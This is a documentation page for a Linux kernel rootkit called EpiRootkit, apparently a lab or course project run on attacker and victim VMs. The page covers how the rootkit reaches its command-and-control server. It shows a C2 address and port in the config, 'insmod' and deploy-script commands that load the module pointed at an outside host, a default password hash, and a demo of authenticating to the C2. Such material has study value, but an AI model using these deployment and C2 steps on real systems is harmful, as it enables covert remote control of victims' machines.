<!doctype html><html lang=en><head><meta charset=utf-8><title>Connection & Authentication | Tux Fan Club Docs</title>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="How the rootkit connects to C2 server and authenticates"><meta name=keywords content="Documentation,Hugo,Hugo Theme,Bootstrap"><meta name=author content="Colin Wilson - Lotus Labs"><meta name=email content="support@aigis.uk"><meta name=website content="https://lotusdocs.dev"><meta name=Version content="v0.1.0"><link rel=icon href=/favicon.ico sizes=any><link rel=icon type=image/svg+xml href=/favicon.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=/site.webmanifest><meta property="og:title" content="Connection & Authentication"><meta property="og:description" content="How the rootkit connects to C2 server and authenticates"><meta property="og:type" content="article"><meta property="og:url" content="/docs/05-epirootkit/connection-authentication/"><meta property="og:image" content="/opengraph/card-base-2_hu_ed79751525dcb253.png"><meta property="article:section" content="docs"><meta property="article:published_time" content="2025-05-07T00:44:31+01:00"><meta property="article:modified_time" content="2025-06-01T02:02:11+02:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/opengraph/card-base-2_hu_ed79751525dcb253.png"><meta name=twitter:title content="Connection & Authentication"><meta name=twitter:description content="How the rootkit connects to C2 server and authenticates"><link rel=alternate type=application/atom+xml title="Atom feed for Tux Fan Club Docs" href=/index.xml><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><script type=text/javascript src=/docs/js/flexsearch.bundle.min.249548594cb6843f3060a3cdd3043799676c59ce8db83358a3fc2e4d20598d05dfa6ce4994805d2835cb33b54dc9b9e7.js integrity=sha384-JJVIWUy2hD8wYKPN0wQ3mWdsWc6NuDNYo/wuTSBZjQXfps5JlIBdKDXLM7VNybnn crossorigin=anonymous></script><link rel=preconnect href=https://fonts.gstatic.com/><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link href="https://fonts.googleapis.com/css?family=Inter:300,400,600,700|Fira+Code:500,700&display=block" rel=stylesheet><link rel=stylesheet href=/docs/scss/style.min.47627c508718021a8811f17bfd419041ce97729127a3db8f6bcf7c26c29fbacf37e002e618d60350aae90d89464e8447.css integrity=sha384-R2J8UIcYAhqIEfF7/UGQQc6XcpEno9uPa898JsKfus834ALmGNYDUKrpDYlGToRH crossorigin=anonymous></head><body><div class=content><div class="page-wrapper toggled"><nav id=sidebar class=sidebar-wrapper><div class=sidebar-brand><a href=/ aria-label=HomePage alt=HomePage><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></a></div><div class=sidebar-content style="height:calc(100% - 131px)"><ul class=sidebar-menu><li><a class=sidebar-root-link href=/docs/01-introduction/presentation/><i class="material-icons me-2">code</i>
Presentation</a></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">code</i>
Setup</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/02-setup/environment/>Host Environment Setup</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/vm-installation/>VM Installation & Verification</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/attacking-vm-setup/>Attacker VM Setup</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/victim-vm-setup/>Victim VM Setup</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/file-transfer/>Host to VM File Transfer</a></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">notes</i>
Attacking Program (C2 Server)</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/03-attacking-program/overview/>Overview</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/installation/>Installation</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/commands/>Command Reference</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/usage/>Usage & Workflows</a></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">monitor</i>
Web UI (C2 Frontend)</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/04-web-ui/overview/>Overview</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/installation/>Installation & Setup</a></li><li class="sidebar-dropdown nested"><button class=btn>
Features</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/authentication/>Authentication</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/dashboard/>Dashboard</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/client-management/>Client Management</a></li><li class="sidebar-dropdown nested"><button class=btn>
UI Panels</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/terminal-panel/>Terminal Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/persistence-panel/>Persistence Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/event-log-panel/>Event Log Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/upload-download-panel/>Upload/Download Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/overview-panel/>Overview Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/configuration-panel/>Configuration Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/authentication-panel/>Authentication Panel</a></li></ul></div></li></ul></div></li></ul></div></li><li class="sidebar-dropdown current active"><button class=btn>
<i class="material-icons me-2">shield</i>
EpiRootkit</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=/docs/05-epirootkit/configuration-justifications/>Configuration Justifications</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/overview/>EpiRootkit Overview</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/deployment/>Build & Deployment</a></li><li class=current><a class=sidebar-nested-link href=/docs/05-epirootkit/connection-authentication/>Connection & Authentication</a></li><li class="sidebar-dropdown nested"><button class=btn>
Features</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/command-execution/>Command Execution</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/file-transfer/>File Transfer</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/hiding/>Stealth & Hiding</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/persistence/>Persistence</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/dns-resolution/>DNS Resolution</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/encryption/>XOR Encryption</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/line-hiding/>Line Hiding</a></li></ul></div></li></ul></div></li><li><a class=sidebar-root-link href=/docs/06-bonuses/wlkom-ctf/><i class="material-icons me-2">savings</i>
Tux Fan Club: Chasse au TrÃ©sor Pirate</a></li><li><a class=sidebar-root-link href=/docs/07-remerciements/thankyou/><i class="material-icons me-2">favorite</i>
Un dernier mot</a></li></ul></div><ul class="sidebar-footer list-unstyled mb-0"></ul></nav><main class="page-content bg-transparent"><div id=top-header class="top-header d-print-none"><div class="header-bar d-flex justify-content-between"><div class="d-flex align-items-center"><a href=/ class="logo-icon me-3" aria-label=HomePage alt=HomePage><div class=small><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div><div class=big><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div></a><button id=close-sidebar class="btn btn-icon btn-soft">
<span class="material-icons size-20 menu-icon align-middle">menu</span>
</button>
<button id=flexsearch-button class="ms-3 btn btn-soft" data-bs-toggle=collapse data-bs-target=#FlexSearchCollapse aria-expanded=false aria-controls=FlexSearchCollapse>
<span class="material-icons size-20 menu-icon align-middle">search</span>
<span class="flexsearch-button-placeholder ms-1 me-2 d-none d-sm-block">Search</span><div class="d-none d-sm-block"><span class=flexsearch-button-keys><kbd class=flexsearch-button-cmd-key><svg width="44" height="15"><path d="M2.118 11.5A1.519 1.519.0 011 11.042 1.583 1.583.0 011 8.815a1.519 1.519.0 011.113-.458h.715V6.643h-.71A1.519 1.519.0 011 6.185 1.519 1.519.0 01.547 5.071 1.519 1.519.0 011 3.958 1.519 1.519.0 012.118 3.5a1.519 1.519.0 011.114.458A1.519 1.519.0 013.69 5.071v.715H5.4V5.071A1.564 1.564.0 016.976 3.5 1.564 1.564.0 018.547 5.071 1.564 1.564.0 016.976 6.643H6.261V8.357h.715a1.575 1.575.0 011.113 2.685 1.583 1.583.0 01-2.227.0A1.519 1.519.0 015.4 9.929V9.214H3.69v.715a1.519 1.519.0 01-.458 1.113A1.519 1.519.0 012.118 11.5zm0-.857a.714.714.0 00.715-.714V9.214H2.118a.715.715.0 100 1.429zm4.858.0a.715.715.0 100-1.429H6.261v.715a.714.714.0 00.715.714zM3.69 8.357H5.4V6.643H3.69zM2.118 5.786h.715V5.071a.714.714.0 00-.715-.714.715.715.0 00-.5 1.22A.686.686.0 002.118 5.786zm4.143.0h.715a.715.715.0 00.5-1.22.715.715.0 00-1.22.5z" fill="currentcolor"/><path d="M12.4 11.475H11.344l3.879-7.95h1.056z" fill="currentcolor"/><path d="M25.073 5.384l-.864.576a2.121 2.121.0 00-1.786-.923 2.207 2.207.0 00-2.266 2.326 2.206 2.206.0 002.266 2.325 2.1 2.1.0 001.782-.918l.84.617a3.108 3.108.0 01-2.622 1.293 3.217 3.217.0 01-3.349-3.317 3.217 3.217.0 013.349-3.317A3.046 3.046.0 0125.073 5.384z" fill="currentcolor"/><path d="M30.993 5.142h-2.07v5.419H27.891V5.142h-2.07V4.164h5.172z" fill="currentcolor"/><path d="M34.67 4.164c1.471.0 2.266.658 2.266 1.851.0 1.087-.832 1.809-2.134 1.855l2.107 2.691h-1.28L33.591 7.87H33.07v2.691H32.038v-6.4zm-1.6.969v1.8h1.572c.832.0 1.22-.3 1.22-.918s-.411-.882-1.22-.882z" fill="currentcolor"/><path d="M42.883 10.561H38.31v-6.4h1.033V9.583h3.54z" fill="currentcolor"/></svg>
</kbd><kbd class=flexsearch-button-key><svg width="15" height="15"><path d="M5.926 12.279H4.41L9.073 2.721H10.59z" fill="currentcolor"/></svg></kbd></span></div></button></div><div class="d-flex align-items-center"><ul class="list-unstyled mb-0"><li class="list-inline-item mb-0"><a href=https://github.com/KazeTachinuu/epirootkit-docs alt=github rel="noopener noreferrer" target=_blank><div class="btn btn-icon btn-default border-0"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>GitHub</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></div></a></li></ul><button id=mode class="btn btn-icon btn-default ms-2" type=button aria-label="Toggle user interface mode">
<span class=toggle-dark><svg height="30" width="30" viewBox="0 0 48 48" fill="currentcolor"><title>Enable dark mode</title><path d="M24 42q-7.5.0-12.75-5.25T6 24t5.25-12.75T24 6q.4.0.85.025.45.025 1.15.075-1.8 1.6-2.8 3.95t-1 4.95q0 4.5 3.15 7.65Q28.5 25.8 33 25.8q2.6.0 4.95-.925T41.9 22.3q.05.6.075.975Q42 23.65 42 24q0 7.5-5.25 12.75T24 42zm0-3q5.45.0 9.5-3.375t5.05-7.925q-1.25.55-2.675.825Q34.45 28.8 33 28.8q-5.75.0-9.775-4.025T19.2 15q0-1.2.25-2.575t.9-3.125q-4.9 1.35-8.125 5.475Q9 18.9 9 24q0 6.25 4.375 10.625T24 39zm-.2-14.85z"/></svg>
</span><span class=toggle-light><svg height="30" width="30" viewBox="0 0 48 48" fill="currentcolor"><title>Enable light mode</title><path d="M24 31q2.9.0 4.95-2.05T31 24t-2.05-4.95T24 17t-4.95 2.05T17 24t2.05 4.95T24 31zm0 3q-4.15.0-7.075-2.925T14 24t2.925-7.075T24 14t7.075 2.925T34 24t-2.925 7.075T24 34zM3.5 25.5q-.65.0-1.075-.425Q2 24.65 2 24t.425-1.075Q2.85 22.5 3.5 22.5h5q.65.0 1.075.425Q10 23.35 10 24t-.425 1.075T8.5 25.5zm36 0q-.65.0-1.075-.425Q38 24.65 38 24t.425-1.075T39.5 22.5h5q.65.0 1.075.425Q46 23.35 46 24t-.425 1.075-1.075.425zM24 10q-.65.0-1.075-.425Q22.5 9.15 22.5 8.5v-5q0-.65.425-1.075Q23.35 2 24 2t1.075.425T25.5 3.5v5q0 .65-.425 1.075Q24.65 10 24 10zm0 36q-.65.0-1.075-.425T22.5 44.5v-5q0-.65.425-1.075Q23.35 38 24 38t1.075.425.425 1.075v5q0 .65-.425 1.075Q24.65 46 24 46zM12 14.1l-2.85-2.8q-.45-.45-.425-1.075.025-.625.425-1.075.45-.45 1.075-.45t1.075.45L14.1 12q.4.45.4 1.05.0.6-.4 1-.4.45-1.025.45T12 14.1zm24.7 24.75L33.9 36q-.4-.45-.4-1.075t.45-1.025q.4-.45 1-.45t1.05.45l2.85 2.8q.45.45.425 1.075-.025.625-.425 1.075-.45.45-1.075.45t-1.075-.45zM33.9 14.1q-.45-.45-.45-1.05.0-.6.45-1.05l2.8-2.85q.45-.45 1.075-.425.625.025 1.075.425.45.45.45 1.075t-.45 1.075L36 14.1q-.4.4-1.025.4t-1.075-.4zM9.15 38.85q-.45-.45-.45-1.075t.45-1.075L12 33.9q.45-.45 1.05-.45.6.0 1.05.45.45.45.45 1.05.0.6-.45 1.05l-2.8 2.85q-.45.45-1.075.425-.625-.025-1.075-.425zM24 24z"/></svg></span></button></div></div><div class=collapse id=FlexSearchCollapse><div class=flexsearch-container><div class=flexsearch-keymap><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd>
<kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd>
<span class=flexsearch-key-label>to navigate</span></li><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd>
<span class=flexsearch-key-label>to select</span></li><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd>
<span class=flexsearch-key-label>to close</span></li></div><form class="flexsearch position-relative flex-grow-1 ms-2 me-2"><div class="d-flex flex-row"><input id=flexsearch class=form-control type=search placeholder=Search aria-label=Search autocomplete=off>
<button id=hideFlexsearch type=button class="ms-2 btn btn-soft">
cancel</button></div><div id=suggestions class="shadow rounded-1 d-none"></div></form></div></div></div><div class=container-fluid><div class=layout-spacing><div class="d-md-flex justify-content-between align-items-center"><nav aria-label=breadcrumb class="d-inline-block pb-2 mt-1 mt-sm-0"><ul id=breadcrumbs class="breadcrumb bg-transparent mb-0" itemscope itemtype=https://schema.org/BreadcrumbList><li class="breadcrumb-item text-capitalize active" aria-current=page itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/><i class="material-icons size-20 align-text-bottom" itemprop=name>Home</i>
</a><meta itemprop=position content='1'></li><li class="breadcrumb-item text-capitalize" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/05-epirootkit/><span itemprop=name>EpiRootkit</span>
</a><meta itemprop=position content='2'></li><li class="breadcrumb-item text-capitalize active" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><span itemprop=name>Connection & Authentication</span>
<meta itemprop=position content='3'></li></ul></nav></div><div class="row flex-xl-nowrap"><div class="docs-toc col-xl-3 d-xl-block"><toc><div class="fw-bold text-uppercase mb-2">On this page</div><nav id=toc><ul><li><a href=#connection--authentication>Connection & Authentication</a><ul><li><a href=#connection-process>Connection Process</a><ul><li><a href=#configuration-with-domain-support>Configuration with Domain Support</a></li><li><a href=#runtime-parameters>Runtime Parameters</a></li></ul></li><li><a href=#authentication-system>Authentication System</a><ul><li><a href=#how-it-works>How It Works</a></li><li><a href=#implementation>Implementation</a></li><li><a href=#security-features>Security Features</a></li></ul></li><li><a href=#keepalive-system>Keepalive System</a><ul><li><a href=#monitoring>Monitoring</a></li></ul></li><li><a href=#live-demo>Live Demo</a><ul><li><a href=#1-start-c2-server>1. Start C2 Server</a></li><li><a href=#2-load-rootkit-with-domain>2. Load Rootkit with Domain</a></li><li><a href=#3-authenticate>3. Authenticate</a></li></ul></li></ul></li></ul></nav></toc></div><div class="docs-toc-mobile d-print-none d-xl-none"><button id=toc-dropdown-btn class="btn-secondary dropdown-toggle" type=button data-bs-toggle=dropdown data-bs-offset=0,0 aria-expanded=false>
Table of Contents</button><nav id=toc-mobile><ul class=dropdown-menu><li><a href=#connection--authentication>Connection & Authentication</a><ul><li><a href=#connection-process>Connection Process</a><ul><li><a href=#configuration-with-domain-support>Configuration with Domain Support</a></li><li><a href=#runtime-parameters>Runtime Parameters</a></li></ul></li><li><a href=#authentication-system>Authentication System</a><ul><li><a href=#how-it-works>How It Works</a></li><li><a href=#implementation>Implementation</a></li><li><a href=#security-features>Security Features</a></li></ul></li><li><a href=#keepalive-system>Keepalive System</a><ul><li><a href=#monitoring>Monitoring</a></li></ul></li><li><a href=#live-demo>Live Demo</a><ul><li><a href=#1-start-c2-server>1. Start C2 Server</a></li><li><a href=#2-load-rootkit-with-domain>2. Load Rootkit with Domain</a></li><li><a href=#3-authenticate>3. Authenticate</a></li></ul></li></ul></li></ul></nav></div><div class="docs-content col-12 col-xl-9 mt-0"><div class="mb-0 d-flex"><i class="material-icons title-icon me-2">link</i><h1 class="content-title mb-0">Connection & Authentication</h1></div><p class="lead mb-3">How the rootkit connects to C2 server and authenticates</p><div id=content class=main-content data-bs-spy=scroll data-bs-root-margin="0px 0px -65%" data-bs-target=#toc-mobile><div data-prismjs-copy data-prismjs-copy-success data-prismjs-copy-error><h1 id=connection--authentication>Connection & Authentication <a href=#connection--authentication class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h1><p>How EpiRootkit connects to the C2 server and handles authentication with <strong>domain support</strong> and <strong>XOR encryption</strong>.</p><h2 id=connection-process>Connection Process <a href=#connection-process class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><p>When the rootkit loads, it automatically:</p><ol><li><strong>Starts connection thread</strong> (<code>epirootkit_conn</code>)</li><li><strong>Resolves domain</strong> (if address is domain name) - see <a data-bs-delay='{"hide":300,"show":550}' data-bs-html=true data-bs-title="<a href='/docs/05-epirootkit/features/dns-resolution/'><p>FEATURES</p><strong>DNS Resolution</strong><br>Kernel-space domain name resolution for flexible C2 connectivity</a>" data-bs-toggle=tooltip href=/docs/05-epirootkit/features/dns-resolution/>DNS Resolution</a></li><li><strong>Attempts TCP connection</strong> to configured C2 server</li><li><strong>Begins keepalive system</strong> (60-second ping/pong)</li><li><strong>Enables XOR encryption</strong> for all C2 communication</li><li><strong>Handles reconnection</strong> with exponential backoff</li></ol><h3 id=configuration-with-domain-support>Configuration with Domain Support <a href=#configuration-with-domain-support class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=50c73ea class=language-c>
  <code>// rootkit/core/config.h - Domain examples
#define C2_SERVER_ADDRESS &#34;jules-c2.example.com&#34;  // Domain name
#define C2_SERVER_PORT 4444
#define KEEPALIVE_INTERVAL_MS 60000
#define RECONNECT_DELAY_MS 5000

// Or traditional IP
#define C2_SERVER_ADDRESS &#34;192.168.64.1&#34;  // IP address
#define C2_SERVER_PORT 4444</code>
  </pre></div><h3 id=runtime-parameters>Runtime Parameters <a href=#runtime-parameters class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><p>Override config.h settings during deployment:</p><div class=prism-codeblock><pre id=2baa705 class=language-bash>
  <code># Deploy with domain
sudo ./deploy_rootkit.sh address=secure.company.net port=443

# Deploy with IP
sudo ./deploy_rootkit.sh address=10.0.0.100 port=8080</code>
  </pre></div><h2 id=authentication-system>Authentication System <a href=#authentication-system class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=how-it-works>How It Works <a href=#how-it-works class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><ol><li><strong>C2 sends command</strong>: <code>auth Client-1 password</code></li><li><strong>Rootkit receives</strong>: Plain text password</li><li><strong>Rootkit hashes</strong>: Using SHA-512 kernel crypto API</li><li><strong>Compares hash</strong>: Against stored hash in config</li><li><strong>Returns result</strong>: SUCCESS or ERROR</li></ol><h3 id=implementation>Implementation <a href=#implementation class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=0cf9ed6 class=language-c>
  <code>// Default password is &#34;password&#34; (SHA-512 hash stored in config)
#define PASSWORD_HASH &#34;b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86&#34;</code>
  </pre></div><h3 id=security-features>Security Features <a href=#security-features class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><ul><li><strong>Rate limiting</strong>: 5 attempts per 60 seconds</li><li><strong>Session timeout</strong>: 1 hour automatic expiry</li><li><strong>Secure hashing</strong>: SHA-512 using kernel crypto API</li></ul><h2 id=keepalive-system>Keepalive System <a href=#keepalive-system class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><ul><li><strong>Ping interval</strong>: Every 60 seconds</li><li><strong>Timeout detection</strong>: 30 seconds for response</li><li><strong>Failure threshold</strong>: 3 consecutive failed pings</li><li><strong>Automatic reconnection</strong>: Exponential backoff (5s â†’ 10s â†’ 20s â†’ 40s â†’ 60s max)</li></ul><h3 id=monitoring>Monitoring <a href=#monitoring class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=b5b8f89 class=language-bash>
  <code># Check keepalive status from C2
c2-server$ keepalive Client-1
# Keepalive Status:
# Last ping sent: 2025-05-25 16:14:00
# Last pong received: 2025-05-25 16:14:00
# Failed ping count: 0
# Connection stable: YES</code>
  </pre></div><h2 id=live-demo>Live Demo <a href=#live-demo class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=1-start-c2-server>1. Start C2 Server <a href=#1-start-c2-server class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=5dc0b98 class=language-bash>
  <code>cd attacking_program &amp;&amp; pnpm start</code>
  </pre></div><h3 id=2-load-rootkit-with-domain>2. Load Rootkit with Domain <a href=#2-load-rootkit-with-domain class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=e6f6230 class=language-bash>
  <code># Deploy with domain name
sudo ./deploy_rootkit.sh address=c2.test-domain.com port=4444

# Or load directly
sudo insmod epirootkit.ko address=c2.test-domain.com port=4444</code>
  </pre></div><p><strong>C2 server shows:</strong></p><div class=prism-codeblock><pre id=dd13a57 class=language->
  <code>[2025-05-25 16:13:09] New client connected: Client-1
[2025-05-25 16:13:09] Client-1 status: UNAUTHENTICATED</code>
  </pre></div><h3 id=3-authenticate>3. Authenticate <a href=#3-authenticate class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=59242a8 class=language-bash>
  <code>c2-server$ auth Client-1 password
# âœ“ [2025-05-25 16:13:29] Authenticated
# SUCCESS: Authentication successful</code>
  </pre></div><p>For DNS resolution details, see <a data-bs-delay='{"hide":300,"show":550}' data-bs-html=true data-bs-title="<a href='/docs/05-epirootkit/features/dns-resolution/'><p>FEATURES</p><strong>DNS Resolution</strong><br>Kernel-space domain name resolution for flexible C2 connectivity</a>" data-bs-toggle=tooltip href=/docs/05-epirootkit/features/dns-resolution/>DNS Resolution</a>.</p></div><div class="gitinfo d-flex flex-wrap justify-content-between align-items-center opacity-85 pt-3"><div id=edit-this-page class=mt-1><a href=https://github.com/kazetachinuu/epirootkit-docs/blob/master/content/docs/05-epirootkit/connection-authentication.md alt="Connection & Authentication" rel="noopener noreferrer" target=_blank><span class="me-1 align-text-bottom"><svg width="20" height="20" viewBox="0 0 32 32" fill="currentcolor"><path d="M16 .396c-8.839.0-16 7.167-16 16 0 7.073 4.584 13.068 10.937 15.183.803.151 1.093-.344 1.093-.772.0-.38-.009-1.385-.015-2.719-4.453.964-5.391-2.151-5.391-2.151-.729-1.844-1.781-2.339-1.781-2.339-1.448-.989.115-.968.115-.968 1.604.109 2.448 1.645 2.448 1.645 1.427 2.448 3.744 1.74 4.661 1.328.14-1.031.557-1.74 1.011-2.135-3.552-.401-7.287-1.776-7.287-7.907.0-1.751.62-3.177 1.645-4.297-.177-.401-.719-2.031.141-4.235.0.0 1.339-.427 4.4 1.641 1.281-.355 2.641-.532 4-.541 1.36.009 2.719.187 4 .541 3.043-2.068 4.381-1.641 4.381-1.641.859 2.204.317 3.833.161 4.235 1.015 1.12 1.635 2.547 1.635 4.297.0 6.145-3.74 7.5-7.296 7.891.556.479 1.077 1.464 1.077 2.959.0 2.14-.02 3.864-.02 4.385.0.416.28.916 1.104.755 6.4-2.093 10.979-8.093 10.979-15.156.0-8.833-7.161-16-16-16z"/></svg>
